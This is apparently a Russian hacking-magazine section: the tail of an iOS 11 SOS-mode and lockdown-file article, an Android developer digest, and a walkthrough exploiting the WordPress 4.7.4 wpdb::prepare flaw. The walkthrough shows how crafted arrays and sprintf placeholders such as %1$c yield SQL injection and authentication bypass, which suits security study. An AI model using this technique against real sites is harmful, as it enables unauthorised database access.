  Ре жим SOS — возможность в подоб ных случаях быс тро заблокировать
датчик отпе чатка. Обрати вни мание: даже такой сом нитель ный с точ ки зрения
законности ордер не давал полиции права тре бовать от находившихся в зда‐
нии в момент обыска сообщать пароли от устройств или разблокировать
сами устройства с помощью паролей.
   Даль ше будет только интереснее. Так, для использования новой тех‐
нологии Apple Face ID не нужно даже прик ладывать пальца к устрой ству. Дос‐
таточно про вести стандартную процедуру фотог рафирования подозрева емо‐
го, нап равив на него камеру iPhone, — и устрой ство будет разблокировано.


Как обойти
Как ни стран но, новый режим SOS никак не влияет на работоспособность
lockdown‐фай лов. Их по‐прежнему можно извлечь с компьютера подозрева‐
емого и исполь зовать для того, чтобы разблокировать его iPhone даже после
использования функции SOS. С нашей точ ки зре ния, это как минимум
нелогично, если уж в Apple начали бороть ся с полицейским произво лом, то
надо идти до кон ца. Тем не менее факт остается фактом: lockdown‐записи
в iOS 11 ведут себя точ но так же, как в предыдущей вер сии ОС. Они не уда‐
ляются и не отключают ся в SOS‐режиме.


Как защититься?
Защититься от дос мотра iPhone при помощи lockdown‐записи, извлеченной
с тво его компь ютера, вполне воз можно. Знай, что с помощью lockdown‐
записи мож но разбло киро вать только воз можность соз дания локальной
резервной копии устрой ства через iTunes или Elcomsoft iOS Forensic Toolkit.
Экран устройства с ее помощью разблокировать нель зя.
   Та ким образом, что бы защититься от произвола, проще всего установить
уме ренно длинный и сложный пароль на резервные копии в iTunes. Главное
здесь — что бы пароль был уникальным и не использовал ся больше нигде (в
про тив ном случае извлечь его из твоего компь ютера может быть делом тех‐
ники). Сде лать это можно на главном экра не iTunes.





Этого будет вполне достаточно. В iOS 11 шифрование резервных копий чрез‐
вычай но стойкое, а скорость перебо ра без исполь зования GPU — еди ницы
паролей в минуту. Даже про фессиональные решения, использующие виде‐
окар ты в качестве ускорителей, не смог ли пре одолеть отметку в сто (всего
сто!) паролей в секунду. Это означает, что пароль из вось ми‐девяти знаков,
в котором будут как буквы, так и циф ры, даст — с уче том скорос ти техничес‐
кого прогресса — надеж ность с запасом на ближай шие десятилетия.


ЗАКЛЮЧЕНИЕ
Мы рассмотрели три неочевидные особенности iOS  11, две из которых
помогут обезопасить данные от полицейского произвола, а одна до сих пор
остается вполне доступной уязвимостью. Самое интересное здесь даже не в
тех нических средствах защиты, они довольно незамысловаты. Интересен
юридический и политичес кий подтекст, подтол кнув ший Apple к вве дению
подоб ных мер. Его мы и постарались рассмотреть по мере сил.
X‐MOBILE              ← НАЧАЛО СТАТЬИ





         ВЗЛОМ ПРИЛОЖЕНИЙ ДЛЯ AN‐
        DROID И IOS И ИНСТРУМЕНТЫ ДЛЯ
            МОБИЛЬНОГО ПЕНТЕСТЕРА





Как работает runOnUiThread
Understanding Activity.runOnUiThread() — небольшая заметка, посвящен ная
тому, как работает метод runOnUiThread, пред назна ченный для запуска кода
в основном потоке приложения. В целом все очень прос то:


public final void runOnUiThread(Runnable action) {
    if (Thread.currentThread() != mUiThread) {
        mHandler.post(action);
    } else {
        action.run();
    }
...
}

Однако ценность статьи вовсе не в этих шес ти строках, а в том, что, отталки‐
ваясь от этого кода, автор очень доход чиво объ ясняет,  как работают
механизмы мно гопо точного прог рамми рования в Android: луперы, сооб‐
щения и хен дле ры. Если нужно освоить эту тему, то более понят ного объ‐
яснения ты не най дешь.


Валидация вход ных дан ных в Kotlin
Preconditions.kt: Validate Your Kotlin — статья с описанием двух встроенных
в  Kotlin инструментов для валидации вход ных данных. Например, когда
переданный функции мас сив должен быть опре деленной длины или не быть
пустым. Рас смот ренные в статье инс трумен ты:
 • require() — проверя ет усло вие и, если оно не выполнено, выбрасывает
   исклю чение IllegalArgumentException. Пример:


   fun <T> getFifthElement(array: Array<T>): T {
       require(array.size >= 5) {
           "array should have at least five elements, but has ${
   array.size}!"
       }
       return array[4]
   }

 • check() — ана лог require, выб расыва ющий исклю чение IllegalStateExcep‐
    tion (что означает «не вовремя, чувак»).


Как писать DSL в Kotlin
Creating DSL with Kotlin Introducing a TLSLibrary — хорошая ввод ная статья
о создании своего собственного DSL (Domain Speciﬁc Languages) поверх
Kotlin.
  DSL — это некий узкоспециализирован ный мини‐язык. Хороший пример
такого языка — система прог раммирования интерфей са в биб лиотеке Anko.
Написанный с ее помощью код оста ется корректным кодом Kotlin, но выг‐
лядит как набор строк на другом языке. DSL хорошо под ходит для задач, тре‐
бующих выпол нения множес тва одно типных действий. Он позволя ет сделать
код более чистым и понятным.
  В статье автор демонстрирует пример создания DSL для работы с биб‐
лиотекой SSL/TLS. Ключевую роль здесь играют так называемые литералы
функций с объ ектом‐при емником (function literals with receiver), которые пред‐
став ляют собой сплав лямбд и фун кций‐расширений. Дру гими словами,
это лямбды, которые работают в прос транс тве имен ука занного объ екта.
  С помощью таких лямбд можно создать мини‐язык внутри языка:


val fac = socketFactory {
    keyManager {
        open("certsandstores/clientkeystore") withPass "123456"
beingA "jks"
    }
    trustManager {
        open("certsandstores/myTruststore") withPass "123456" beingA
"jks"
    }
    sockets {
        cipherSuites =
        listOf("TLS_ECDHE_RSA_WITH_AES_128_GCM_SHA256",
                "TLS_ECDHE_RSA_WITH_AES_256_GCM_SHA384",
                "TLS_DHE_RSA_WITH_AES_128_CBC_SHA",
                "TLS_DHE_RSA_WITH_AES_256_CBC_SHA")
        timeout = 10_000
    }
}
val socket = fac.createSocket("192.168.3.200", 9443)


Android и нейросети
Through the Looking Glass: Computer Vision on Android — статья о том,
как задей ствовать облачные ML‐сер висы в своем при ложе нии для распозна‐
вания изображений.
   Автор по очереди берет Google Cloud Vision, Cognitive Services Microsoft,
IBM Watson и показывает код для тегирования объ ектов на фотографии,
определе ния возраста и пола человека, рас познавания текста и накладыва‐
ния масок на лицо в сти ле Snapchat. Приведенный в статье код не полный,
но его уже дос таточно, что бы начать пользовать ся сервисами.


Оптимизация приложе ний
Android App Performance Optimization — неболь шая заметка, пос вященная
про фили рованию и устранению узких мест в коде приложения. Состоит
из четырех разделов.
 • Обновле ние интерфей са. Когда ОС не успевает обновить содер жимое
   экрана за 16 мс, происходит фреймдроп — система пропус кает один
   или несколь ко кадров, из‐за чего поль зователь видит лаги. Выявить узкие
  места поможет встроенный в Android GPU‐профай лер: Settings → Develop‐
   er Options → Proﬁle → GPU Rendering (необходимо следить, чтобы стол бцы
   не пересекали зеленую черту).
 • Вре мя запуска при ложения. Простой совет: все, что можно инициализиро‐
   вать поз же, нужно инициали зировать поз же, в том чис ле интерфейс —
   сначала отображаем «скелет интерфейса», а затем асинхронно загружаем
   в него ресурсы (изображения и прочее).
 • Лейауты. Что бы сделать интерфейс более быстрым для отображения,
   необходимо избе гать излишнего вло жения лей аутов друг в дру га, раз‐
   бивать лей ауты на неболь шие части и использовать их заново, загружать
   лейауты толь ко по мере необходимости.
 • Батарея. Несколько прос тых советов: использовать сетевые запросы
   и вейклоки (wakelock) как мож но реже, с осторож ностью использовать
  GPS и AlarmManager, объеди нять задачи и выполнять их одновре менно.


Работа с BLE-маяч ками
Beacons on Android — простая и понятная ввод ная статья о работе с BLE‐
маячками (beacon). Они представляют собой крохот ные устрой ства, которые
через опре деленные интервалы времени переда ют данные с помощью Blue‐
tooth Low Energy. Пой мав сиг нал маячка, можно вычислить его мес тополо‐
жение и таким образом опре делить положение самого смартфо на в помеще‐
нии. Также от маячка можно получить дан ные (нап ример, информацию о кар‐
тине в музее).
   Статья рас сказывает о раз личных протоко лах обмена данными с маяч ками
(Apple iBeacon, Google Eddystone и AltBeacon) и о том, как работать с ними
с помощью биб лиотеки android‐beacon‐library. В целом задача решается бук‐
вально в пару десятков строк кода.


Списки с быстрым скрол лингом
Fast Scrolling with RecyclerView. Статья расска зывает о новой возможности
RecyclerView под названи ем fast scrolling. Эта фун кция появилась в 26‐й вер‐
сии support‐биб лиоте ки и позволяет добавить к спис ку пол зунок, который
дает воз можность быстро про матывать спи сок и при этом видеть на экране
алфавит ный указатель.
  Использовать fast scrolling очень просто, для этого достаточно соз дать Re‐
cyclerView с атри бутом app:fastScrollEnabled="true" и  указать  пути
к drawable, содержащим сам ползунок и пузырь с алфавитным указателем.


Ограниче ния фоново го исполне ния в Android 8
Exploring Background Execution Limits on Android Oreo — статья о том, какие
огра ниче ния применяет Android 8 к приложениям, работающим в фоне.
 • Ограниче ния действу ют только в отношении при ложе ний, собранных
   для API 26 и выше.
 • Приложе ния не могут запускать службы, находясь в фоне. Будет выб‐
  рошено исклю чение IllegalStateException.
 • Приложе ния по‐прежнему могут запускать foreground‐службы, которые
   отоб ражаются в панели уведомлений, и при вязан ные службы.
 • Приложе ния могут запускать служ бы после получения высокоприори тет‐
   ного push‐уведомления, но такая служба будет остановлена через пять
   минут.
 • Приложе ние может запускать службы, находясь на экране, но, если при‐
   ложение будет свернуто, через некото рое время все его службы будут
   завершены.
 • Получа тели неявных широковещательных сооб щений (broadcast receiver),
  объявленные в манифесте, будут отклю чены за некоторыми исключениями
   (см. таб лицу ниже).

Как обойти ограниче ния:
 • вместо фоновых служб можно использовать foreground‐службы;
 • для выполнения задач при воз никновении опре деленных событий подой‐
   дет Job Scheduler;
 • что бы при ложе ние могло реаги ровать на любые широковещательные
   сообщения, получателей этих сооб щений необ ходимо зарегис трировать
  динамически, с помощью метода registerReceiver() .





            Белый спи сок широковещательных сообщений


Скачиваемые шрифты и Android 8
Downloadable Fonts: How does it work? — рассказ о ста ром и новом спо собах
использования нестандартных шрифтов в при ложе нии. Ста рый способ зак‐
люча ется в том, чтобы поместить шрифт в каталоге assets внутри APK и затем
самос тоятельно заг рузить его в приложение. Способ работает, но тре бует
немалых телод вижений и к тому же раздува ет раз мер APK.
  Новый спо соб из Android 8 позволяет ука зать необ ходимые шрифты в XML
и исполь зовать эти шрифты, обращаясь к ним нап рямую с помощью con‐
text.getResources().getFont(R.font.myfont). Система  сама  скачает
шрифт и закеши рует его.


RxJava vs Kotlin
RxJava vs. Kotlin Coroutines, a quick look — рас суждения создателя RxJava
о том, может ли многопоточная модель Kotlin, основанная на сопрограммах,
заменить RxJava и будет ли она удобнее для прог раммиста.
   Автор при ходит к выводу, что, хоть с сопрограм мами и удобно работать,
пока они не могут заменить RxJava. При чина проста: RxJava дает массу воз‐
можнос тей и обкатанных механизмов для решения самых раз ных задач асин‐
хронного программирова ния, без необходимости влезать в дебри самого
асинхрон ного прог рамми рования. RxJava — отлажен ный инструмент с мас‐
сой возможнос тей, сопрограммы же — экспериментальная функция.


Ре жим Picture in Picture
Android Oreo: Picture In Picture Mode — краткое введение в разработку при‐
ложения с поддержкой режима PiP, который поз воляет показывать окно одно‐
го приложения поверх других. С помощью небольших хаков в Android такое
можно было реали зовать всег да, но в Android 8 появил ся официаль ный
механизм.
  Использовать его очень прос то. Дос таточно создать активность с атри‐
бутом android:supportsPictureInPicture="true" и затем вызвать в ней
метод enterPictureInPictureMode(). Всю остальную работу ОС берет
на себя, она сама изменит размеры активнос ти и переместит ее в угол
со всеми нужными эффектами анимации. Выб рать угол для перемещения
и задать другие настройки можно через параметры метода. Переопределив
метод onPictureInPictureModeChanged(), мож но получать уведом ления
о текущем состоянии активности.


Сравнение Realm, ObjectBox и Room
Realm, ObjectBox or Room. Which one is for you — быстрое и наглядное срав‐
нение трех библиотек хранения данных в NAND‐памяти. Саммари:
 • Realm — прос тая в использовании и быстрая NoSQL БД для хранения
  объектов;
 • Room — удобная и простая обертка над SQLite, разработанная Google;
   более слож ная в использовании, не скрывает пол ностью язык запросов
   SQL;
 • ObjectBox — очень простая в использовании и чрезвычай но быстрая
  NoSQL БД, уме ющая сохранять объ екты и все их зависи мости, концепту‐
   ально схожа с Realm.

Что касается произво дительнос ти, то список выг лядит так:
 • с боль шим отры вом побеж дает ObjectBox;
 • на вто ром мес те Realm;
 • на третьем — Room.

Увеличение размера APK пос ле под ключения биб лиотеки:
 • Realm — 3–4 Мбайт;
 • ObjectBox — 1–1,5 Мбайт;
 • Room — 50 Кбайт.





   Аб солютно во всех тес тах ObjectBox вышла безоговорочным победи‐
                              телем


Статический анализ кода с помощью Infer
Finding inter‐procedural bugs at scale with Infer static analyzer — статья о прин‐
ципе работы статического ана лиза тора Infer и его основных отличиях от дру‐
гих анализа торов.
    Infer разработан в Facebook для поиска ошибок в приложениях на C, C++,
Objective‐C и Java. В случае с Java он может выявлять такие ошибки,
как обращение к объекту, содержащему зна чение  null, утеч ки ресур сов,
отсутс твие блокиро вок и сос тояния гон ки.
  Основное отличие этого инс трумен та от других в том, что он умеет
использовать знания обо всем дереве вызовов методов, чтобы найти ошибку.
В качестве примера авто ры при водят код, который берет объ ект, полученный
от одно го метода, и передает его дру гому. Благода ря возможности проана‐
лизи ровать, какие значения возвращает первый метод и как его исполь зует
вто рой, анализатор может предска зать, что пер вый метод может вернуть null,
а вто рой не про веряет свои аргументы на null.

Чат‑бот с использованием нейросетей
Building Chatbot with Firebase and API.AI — статья о создании при ложения
с реали зацией простейшего чат‐бота, который может вести более‐менее
осмысленный диалог. В целом все сводится к прос тому обмену данными
между приложе нием и API.AI: читаем пользовательский ввод, отправляем
API.AI, получаем ответ, отображаем на экра не. Никакого анализа ответов
и полезной функциональ ности.


Плагины Android Studio для более эффективной раз работки
How to become more productive in android with android studio plugins  (пе‐
ревод) — статья с обзо ром плагинов Android Studio, помогающих при раз‐
работ ке. Краткий пересказ:
 • MVP Generator — под готав ливает каркас MVP‐приложения;
 • Parcelable generator — генератор для быс трого соз дания сери ализуемых
  объектов;
 • DTOnator — позволяет соз дать класс на осно ве JSON;
 • ButterKnifeZelezny — генерирует инъ екции ButterKnife на основе кода XML;
 • CodeGlance — мини‐карта кода в сти ле Sublime;
 • Advanced Java Folding — более продвинутая система свер тывания учас‐
   тков кода;
 • Android DPI Calculator — калькулятор величин для различных зна чений DPI;
 • JVM Debugger Memory View — плагин для более точной оценки потребле‐
   ния памяти;
 • Android Resource Usage Count — подсчи тывает, сколько раз ресурс
   исполь зуется приложением, и выводит информа цию рядом с его дек‐
   ларацией;
 • BIU — плагин для сжатия PNG‐изоб ражений;
 • Folding Plugin — позволя ет группировать файлы, располагая их в виртуаль‐
   ных пап ках;
 • GitIgnore — авто матически добавляет в .gitignore все, что не относится
   к исходно му коду;
 • Android Localizationer — плагин для авто матического перевода строк при‐
   ложения на другие язы ки с помощью Microsoft Translator;
 • Android Wiﬁ ADB — позволяет работать с устрой ством через Wi‐Fi вмес то
   USB‐кабеля.


Биб лиоте ки
UberUX — копия стека ани маций в при ложе нии Uber: переходы между
активнос тями, поля ввода, карта с овер леями и мно гое другое;
AnyMaps — биб лиотека‐обертка, позволяющая использовать Google Maps,
OpenStreet Maps или Baidu, не меняя код;
NoiseView — простая библиотека, позволя ющая добавить шум на фотог‐
рафию;
Kotlin Resources — каталог библиотек, написанных на язы ке Kotlin и для
использования в написанных на Kotlin при ложениях;
App Store ScreenShot — веб‐сайт, позволя ющий быстро соз дать красивую
рам ку для скриншота приложения.
K4Kotlin — набор подсобных функций для программистов на Kotlin: скрытие
и анимация View, провер ки на null и другое;
Easydeviceinfo — биб лиоте ка для быстрого получения различной информации
об устройстве: про цессор, память, при ложе ния, сеть и многое дру гое;
SwipeBackLayout — завер шает активность свайпом с одной из сторон экрана;
ObjectBox — очень прос тая в использовании биб лиотека для сохранения
и заг рузки объектов с диска (с под держкой RxJava и Kotlin);
CFAlertDialog — биб лиоте ка для создания прод винутых диалоговых окон.
ВЗЛОМ





        РАСКРУЧИВАЕМ УЯЗВИМОСТИ В WORDPRESS,
                ПРЕПАРИРОВАВ МЕТОД
                       PREPARE





WordPress —  самая  популярная CMS
в  мире. На ней  работа ет  от  четверти
до  трети  сайтов,  и  уязвимости  в  ней
находят час тень ко. На этот раз мы раз‐
берем логичес кую недоработ ку, которая                aLLy                                                                                    ONsec
позволяет  про водить  широкий  спектр              @iamsecurity
атак — от обхо да авто риза ции и SQL‐инъ‐
екций до выполнения про извольного кода.
Добро пожаловать  в  удивительный мир
инъ екций в WordPress!


Уязвимость кро ется в одном из методов ядра, который отвечает за фор‐
мирование зап росов к базе данных. Для нее име ется хиленький PoC, и я его
покажу, но главное — понять саму логику ошиб ки, почему она сущес твует
и каким образом ее мож но проэксплу атировать. Этот материал будет осо‐
бенно полезен тем, кто проводит аудиты исходни ков при ложе ний, которые
взаимо действуют с базами данных, так как в статье будут зат ронуты методы
обнаружения оши бок в кастомных абстракциях для формирования и выпол‐
нения запросов к БД.


СТЕНД
Для начала, как водится, нам понадо бит ся тестовый стенд. На момент
написания статьи уязвимость была исправлена в последней версии WP —
4.8.3. Поэтому мы возьмем вер сию 4.7.4, там баг присутствует, и его можно
потискать. Я рекомендую вос пользоваться докер‐контейнером, в котором
уже есть все необ ходимое для запус ка уста нов ки CMS и не нужно возиться
с настройками веб‐сервера. Благо в ха бе «Докера» есть официальный
репози торий WordPress и мож но развернуть рабочий сервер с нужной вер‐
сией все го несколькими коман дами.


docker run ‐p3306:3306 ‐d ‐‐rm ‐‐name some‐mysql ‐e MYSQL_ROOT_PASS
WORD="toor" mysql
docker run ‐p80:80 ‐d ‐‐link some‐mysql:mysql ‐‐rm ‐e WORDPRESS_DB_PA
SSWORD="toor" wordpress:4.7.4‐php5.6‐apache

Пос ле это го переходим в браузере по IP «Докера» и наблюдаем знамени тую
пятисе кун дную установку.





                           Установка WP

Также мы создадим нес колько скрип тов на PHP, они понадо бятся нам
для понимания и отладки разных сту пеней и вариантов эксплуатации. Все их
будет объеди нять одно — заг рузка ядра WordPress. Это можно сделать
при помощи следующе го кода:


<?php
# No need for the template engine
define( 'WP_USE_THEMES', false );
# Load WordPress Core
require_once( 'wp‐load.php' );

На этом при готов ления закон чены, приступа ем к серфингу по ис ходникам.


РАБОТА С БД В WORDPRESS
Для постро ения и выполнения запросов к базе данных WordPress использует
класс wpdb.


/wp-includes/wp-db.php
38: /**
39:  * WordPress Database Access Abstraction Object
...
51:  */
52: class wpdb {

В качестве драй вера используется MySQLi или MySQL, если пер вая биб‐
лиотека отсутс твует в системе.


/wp-includes/wp-db.php
632:        /* Use ext/mysqli if it exists and:
...
638:        if ( function_exists( 'mysqli_connect' ) ) {
639:            if ( defined( 'WP_USE_EXT_MYSQL' ) ) {
640:                $this‐>use_mysqli = ! WP_USE_EXT_MYSQL;
641:            } elseif ( version_compare( phpversion(), '5.5', '>='
 ) || ! function_exists( 'mysql_connect' ) ) {
642:                $this‐>use_mysqli = true;
643:            } elseif ( false !== strpos( $GLOBALS['wp_version'],
'‐' ) ) {
644:                $this‐>use_mysqli = true;
645:            }
646:        }

Ядро CMS использует метод prepare для обработ ки всех запросов — это кас‐
томная реали зация так называемых под готовленных выраже ний или связыва‐
емых перемен ных (prepared statements).


/wp-includes/wp-db.php
1257:   /**
1258:    * Prepares a SQL query for safe execution. Uses sprintf()‐
like syntax.
1259:    *
1260:    * The following directives can be used in the query format
string:
1261:    *   %d (integer)
1262:    *   %f (float)
1263:    *   %s (string)
1264:    *   %% (literal percentage sign ‐ no argument needed)
...
1291:   public function prepare( $query, $args ) {
1292:       if ( is_null( $query ) )
1293:           return;
...
1300:       $args = func_get_args();
1301:       array_shift( $args );
...
1309:       array_walk( $args, array( $this, 'escape_by_ref' ) );
1310:       return @vsprintf( $query, $args );
1311:   }

Основная идея — в использовании шаб лонов форматирования строк, ана‐
логичных функции sprintf, для указания типа и местоположения переменных
в зап росе. Имен но результат работы vsprintf и возвращает prepare. А эта фун‐
кция — не что иное, как такой же sprintf, только в качестве аргумента она
при нимает массив парамет ров.
  Нап ример, попробуем выполнить какой‐нибудь запрос (тестовый файл,
нас тало твое вре мя!).


$wpdb‐>prepare("SELECT id, user_login FROM $wpdb‐>users WHERE ID =
%d", 1);





          Запрос к базе данных с помощью фун кций WordPress

В процессе работы %d заменяется на параметр, который мы передали, в дан‐
ном случае это единица. В результате мы получаем данные пользователя
с ID=1.
  Но такие статичные запросы нас мало инте ресу ют, давай рас смот рим зап‐
рос с поль зовательскими данными.


$wpdb‐>prepare("SELECT id, user_login FROM $wpdb‐>users WHERE user_l
ogin = %s", $_GET['login']);

Попробуем передать в качес тве логина что‐то в духе стандар тной SQL‐инъ‐
екции — admin' or 1=1. Разумеется, такой вектор не отработает. Про‐
бежимся по пути обработ ки запроса. Как зап рос и параметр попадают
в метод prepare?
  Все переданные параметры сва ливаются в переменную args, а запрос
находится в query.


/wp-includes/wp-db.php
1300:       $args = func_get_args();
1301:       array_shift( $args );

Ес ли в качестве аргумен тов уже был передан массив, то используем его.


1302:       // If args were passed as an array ( in vsprintf), move
them up
1303:       if ( isset( $args[0] ) && is_array($args[0]) )
1304:           $args = $args[0];

Те перь работа с зап росом. Если в нем строковые парамет ры уже обрамле ны
оди нарными или двой ными кавыч ками, убираем их.


1305:       $query = str_replace( "'%s'", '%s', $query ); // in case
someone mistakenly already singlequoted it
1306:       $query = str_replace( '"%s"', '%s', $query ); // double
quote unquoting

Затем идет про верка значений типа ﬂoat, которая не сильно нас интересу ет.


1307:       $query = preg_replace( '|(?<!%)%f|' , '%F', $query ); //
Force floats to be locale unaware

Следующее регулярное выражение добавляет оди нарные кавычки к перемен‐
ным, которые дол жны быть строками. При этом не учи тываются экра нирован‐
ные плейсхолдеры типа %%s.


1308:       $query = preg_replace( '|(?<!%)%s|', "'%s'", $query );
// quote the strings, avoiding escaped strings like %%s

Далее пробегаемся по переданным аргументам функци ей escape_by_ref.


1309:       array_walk( $args, array( $this, 'escape_by_ref' ) );

Фун кция, как ты можешь понять из наз вания, выполняет экранирование
переданных в args значений. На самом деле это лишь обертка с небольшим
условием для _real_escape, которая прогоня ет все отправленные перемен‐
ные через функцию mysqli_real_escape_string.


/wp-includes/wp-db.php
1252:   public function escape_by_ref( &$string ) {
1253:       if ( ! is_float( $string ) )
1254:           $string = $this‐>_real_escape( $string );
1255:   }


/wp-includes/wp-db.php
1168:   function _real_escape( $string ) {
1169:       if ( $this‐>dbh ) {
1170:           if ( $this‐>use_mysqli ) {
1171:               return mysqli_real_escape_string( $this‐>dbh, $
string );
1172:           } else {
1173:               return mysql_real_escape_string( $string, $this‐>
dbh );
1174:           }
1175:       }

Затем данные уле тают в функцию vsprintf, которая вставляет их в запрос,
и он воз вращается пользователю для дальнейших манипуляций.


/wp-includes/wp-db.php
1310:       return @vsprintf( $query, $args );

По этому на выходе запрос с псевдоинъекцией будет корректно экранирован
и выполнен.





     Экраниро вание потенциально опасных дан ных с помощью prepare

С виду вро де бы все логично и акку ратно. Какие же тут могут быть подводные
камни?


                                     Продолжение статьи →
ВЗЛОМ               ← НАЧАЛО СТАТЬИ





                  РАСКРУЧИВАЕМ УЯЗВИМОСТИ В WORDPRESS,
                                  ПРЕПАРИРОВАВ МЕТОД
                                                PREPARE





ПЕРВЫЕ ПРОБЛЕМЫ
Об ратим пристальное вни мание на условие из строчки 1303–1304.


/wp-includes/wp-db.php
1303:       if ( isset( $args[0] ) && is_array($args[0]) )
1304:           $args = $args[0];

Так‐так. Если пер вый элемент из массива парамет ров, переданных для встав‐
ки в зап рос, сам является массивом, то WP почему‐то счи тает, что его и нуж‐
но использовать для дальнейшей работы. А что, если в абс трактном пла гине
в вакууме име ется такой вот код?


test.php
$sql = "SELECT id, post_name, post_title, post_content FROM $wpdb‐>
posts WHERE id = %s AND post_type = %s";
$prepared_sql = $wpdb‐>prepare( $sql, $_GET['id'], 'post' );
print_r( $prepared_sql.PHP_EOL );
var_dump( $wpdb‐>get_results( $prepared_sql ) );

По задумке авто ров пользователь может посмотреть запись из таб лицы пос‐
тов с любым передан ным id. То есть юзер может просматривать все записи,
у которых поле post_type в таб лице имеет значение post.





          Возможный вариант использования уяз вимого кода

Но что будет, если вмес то числа в параметре id мы передадим массив?
На момент выполнения строки 1303 переменная $args будет выглядеть так:


Line 1303: $args = array(2) {
  [0]=>
  array(1) {
    [0]=>
    string(1) "1"
  }
  [1]=>
  string(4) "post"
}

Те перь усло вие if  (  isset(  $args[0]  )  &&  is_array($args[0])  )
истинно и перемен ная при нима ет вот такой вид:


Line 1305: $args = array(1) {
  [0]=>
  string(1) "1"
}

Второго параметра и след прос тыл, одна ко запрос остался тем же, и функция
vsprintf будет обрабатывать два плейсхолдера. Так что если мы отправим
два элемента массива, то сможем манипулировать и вторым параметром
в зап росе, хотя он был жес тко указан в коде. Нап ример, хочу вместо записи
получить страницу с id=2. Да сколько угодно!





  Пе редача массива параметров для модификации зап роса через prepare

Вот такое внедрение. Я думаю, не сос тавит большого труда написать парсер
таких потенциально уязвимых мест в пла гинах или даже в самом ядре WP, что‐
бы най ти и проверить их на возможную эксплуатацию. Импакт от этой уяз‐
вимос ти может быть разным: от получения чувстви тельных данных до RCE.


                                     Продолжение статьи →
ВЗЛОМ               ← НАЧАЛО СТАТЬИ





                  РАСКРУЧИВАЕМ УЯЗВИМОСТИ В WORDPRESS,
                                  ПРЕПАРИРОВАВ МЕТОД
                                                PREPARE





ПРОБЛЕМЫ ПРОДОЛЖАЮТСЯ
При формировании строки с помощью sprintf мож но исполь зовать многие
интерес ные плейсхолдеры. В рус ской докумен тации PHP они называются
«описателями пре образований», но я буду исполь зовать именно термин
«плей схолдер». Тут прос то огромный потенциал для творчества, ведь спи сок
сов сем не ограничивается %d, %s, %f и тому подоб ным.
  Нап ример, мы можем менять порядок аргу ментов. Для это го нужно
использовать n$ после знака процен та, где n — это номер аргу мента.


print(sprintf('%d ‐ %d = 7', 3, 10)); // 3 ‐ 10 = 7
print(sprintf('%2$d ‐ %1$d = 7', 3, 10)); // 10 ‐ 3 = 7

Также нумерация аргумен тов поз воля ет исполь зовать несколько раз одни
и те же параметры.


print(sprintf('%1$d ‐ %1$d = 7', 3, 10)); // 3 ‐ 3 = 7

Как мы можем это применить? Давай предположим, что у нас есть плагин,
в котором про исходит авто ризация пользователя таким вот способом:


test1.php
$prepared_login = $wpdb‐>prepare("user_login = %s", $_GET['login']);
print_r( $prepared_login.PHP_EOL );
$prepared_sql = $wpdb‐>prepare("SELECT id, user_login, user_pass
FROM $wpdb‐>users WHERE $prepared_login AND user_pass = %s", $_GET['
pass']);
print_r( $prepared_sql.PHP_EOL );
var_dump( $wpdb‐>get_results( $prepared_sql ) );

Сна чала prepare обрабатывает логин, а затем готовый кусочек запроса
с логином подстав ляется в зап рос, который также обрабаты вается методом
prepare. Такая логика позволя ет нам делать некоторые интересные вещи. :‐)
   Если мы передадим в качестве пароля строку test, а в качес тве логина
плей схолдер %1$s, то пос ле обработки методом prepare переменная $pre‐
pared_login будет выглядеть так:


string(19) "user_login = '%1$s'"

Дальше второй prepare получит на вход строку


SELECT id, user_login, user_pass FROM $wpdb‐>users WHERE user_login =
 '%1$s' AND user_pass = %s

Таким образом, поле user_login пос ле обработ ки при мет то значение,
которое мы переда ли в user_pass. В результате выпол нится такой вот зап‐
рос:


SELECT id, user_login, user_pass FROM wp_users WHERE user_login = '
test' AND user_pass = 'test'

Те перь с ним можно проворачивать вся кие хит рые манипуляции. Нап ример,
есть интересный модификатор %c.



     %c — аргу мент трак туется как целое и выводится в виде сим вола
      с соответс тву ющим кодом ASCII.


print(sprintf('2 %c 2 = 4', 0x2b)); // 2 + 2 = 4
print(sprintf('2 %c 2 = 4', 43)); // 2 + 2 = 4

Этот модифи катор обрабатывает и переданный параметр, подобно тому
как intval обрабатывает стро ки. Если передать на вход строку, которая
начинается с числа, то оно и будет использовано, а все, что не касается чис‐
ловых данных, будет отброшено.


print(sprintf('2 %c 2 = 4', '43dropme')); // 2 + 2 = 4

Следующий пример уже бли же к нашему слу чаю.


print(sprintf('two + two = %s', 'four')); // two + two = four
print(sprintf('two %1$c two = %s', '43four')); // two + two = 43four

Строка 43 в ASCII дала знак плюс, а four был просто проигнорирован.





          Манипуляции с плейсхолдерами функции sprintf

Те перь собираем все знания вместе для соз дания мегаэксплоита. Что нужно
под ставить вместо первого парамет ра, что бы мы смог ли управлять зап‐
росом?


SELECT id, user_login, user_pass FROM wp_users WHERE user_login = '
param1' AND user_pass = 'param2'

Нап ример, можно экраниро вать кавыч ку при помощи добавления обратного
слеша в первый параметр. Его код в десятич ной системе — 92. Поэтому вто‐
рой параметр должен начинаться с 92, а первый — использовать плей схол‐
дер %1$c.





            Модифи цируем запрос при помощи %c

Выделен ная часть зап роса попадает в усло вие user_login из‐за того, что мы
заэкраниро вали закрыва ющую кавычку, которую добавил первый prepare.


user_login = '\' AND user_pass = '

Этот  обратный  слеш  не  будет  экранирован  функцией  mysql_re‐
al_escape_string прос то потому, что он появляет ся уже пос ле ее отработки.
   То, что мы передаем в параметр pass, теперь станет частью SQL‐запроса.
Такая вот инъекция. Осталось нес колько проблем. Первая — незакрытая оди‐
нарная кавычка. Это на самом деле и не проблема вовсе: как вариант, мы
можем ее отбро сить, используя возможность комменти рования в MySQL.
Добав ляем # в конец второго параметра.





      Коммента рии помогут отбросить ненужный хвост SQL‐запроса

Вторая проблема пос ложнее и поинтерес нее — это валидность запроса.
Сей час он невалиден, потому что пос ле строково го парамет ра сра зу же идут
числа. И вот тут дилемма: от этих чисел зависит результат работы плейсхол‐
дера %c и, соответственно, исход всей опе рации по внед рению в запрос. Нам
нуж но най ти такое зна чение, которое позволит провес ти инъ екцию, но не
будет делать зап рос невалидным.





          Не верный синтаксис SQL‐зап роса после инъекции

Как в MySQL можно связать строку и идущее за ней числовое значение? Пос‐
кольку MySQL исполь зует динами чес кую  типиза цию,  тут  могут помочь
математические операции.





   Проводим матема тические операции над строками и чис лами в MySQL

Плейсхолдер %c из sprintf не про тив чисел со зна ками и отлично с ними
уживается.


print(sprintf('two %1$c two = %s', '+43four')); // two + two =
+43four



         Исполь зование целого со знаком в модификато ре %c

Те перь все составляющие успешной атаки у нас на руках и можно пускать их
в ход.





       Де лаем валидный зап рос путем сложения строк с чис лами

